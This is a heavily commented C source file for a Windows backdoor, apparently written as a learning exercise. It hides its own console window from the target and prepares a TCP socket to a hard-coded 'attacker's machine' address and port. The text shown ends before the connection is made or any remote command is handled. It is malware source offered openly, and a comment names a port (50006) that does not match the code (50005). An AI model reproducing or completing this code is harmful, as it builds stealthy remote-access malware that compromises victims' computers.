//Windows Program Main Function File

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //to include all the .h header libraries
#include <winsock2.h> //for socket programming to establish connection with server
#include <windows.h> //to use windows specific programs
#include <winuser.h> //will be used to interact with the programs
#include <wininet.h> //will be used to interact with the programs
#include <windowsx.h> //will be used to interact with the programs
#include <string.h> //manipulate strings in the program
#include <sys/stat.h> //to get information about file attributes
#include <sys/types.h> //to interact with the files for various options

int sock; //a global variable

//every windows program includes an entry point fn and APIENTRY to access different fns
int APIENTRY winMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdline, int nCmdShow)
// #RULES
// #1 nCmdShow is an Anonymity flag that says if the Main Application will be maxi/minimized or shown normally, which is the first thing that is done in this function.
// #2 The value of a Handle to an instance/module is used by the OS to identify the executable file, when it's loaded in the memory.
// #3 lpCmdline contains CMD line arguments like a unicode string
// #4 hPrev was used in 16bit OSs and just used to be compatible with the windows API. Its value is 0.
{
	HWND stealth; //now the application window will not be visible to the target. Stealth variable is the Handle to our Window.
	AllocConsole(); //a fn that allocates a new console on the attacker's pc, to the calling process everytime the Application is executed.
	
	stealth = FindWindowA("ConsoleWindowClass", NULL); 
	//a function from winuser.h that retrieves a handle to the top level window.
	//this fn uses two arguments where first one is a classname and other is the window name which we defined to be NULL.
	
	ShowWindow(stealth,0); 
	//A fn that decides whether to show the window to the program or not.
	//uses two arguments- Handle instance ie. stealth, nCmdShow ie. 0 to hiding the window and activating another window.
	
	
	/* Below variables are related to Socket Connection Establishment */
	struct sockaddr_in ServAddr; //defining the actual server address
	unsigned short ServPort; //we're using these two variables cuz we require an IP Add and a port to connect to, from our backdoor.
	char *ServIP; //pointer pointing to the memory address of ServIP.
	WSADATA wsaData; 
	//a struct that contains info about the Windows sockets, is required to establish a socket connection to target windows machine.
	//WSADATA is a data structure used by the WSAStartup fn whose return type is an integer. 
	//WSAStartup fn specifies the version of Windows Sockets (winsock2.h) required and to set-up all the things that the application needs to use sockets.
	// https://stackoverflow.com/questions/4991967/how-does-wsastartup-function-initiates-use-of-the-winsock-dll
	
	ServIP = "192.168.1.15"; //the IP of the attacker's machine which will listen to the connections coming from the backdoor.
	ServPort = 50005; //random free port to listen to the connections.
	
	
	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) //if successful it will return 00
	{
		exit(1); //exit the program straightaway if result != 0
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0);
	//defining the socket object
	//AF_INET defines that the connection is established over IPv4
	//SOCK_STREAM defines that its a TCP conn or a 3-way-handshake conn to establish a connection b/w server and target
	
	/* Defining the parameters tthat the ServAddr will take, as it is a part of a structure sockaddr_in */
	memset(&ServAddr, 0, sizeof(ServAddr)); 
	//clears the variables with 0's
	// if ServAddr variable value is "42069" -> "00000"
	ServAddr.sin_family = AF_INET; //PARAMETER 1 ie. IPv4 conn
	ServAddr.sin_addr.s_addr = inet_addr(ServIP); //PARAMETER 2 ie. IP Addr of the server is accessed by inet_addr fn, as we can't use the string "192.168.1.15"
	ServAddr.sin_port = htons(ServPort); //PARAMETER 3 ie. to assign the value of the Port, using the htons fn, as we can't use the integer 50006
	
}
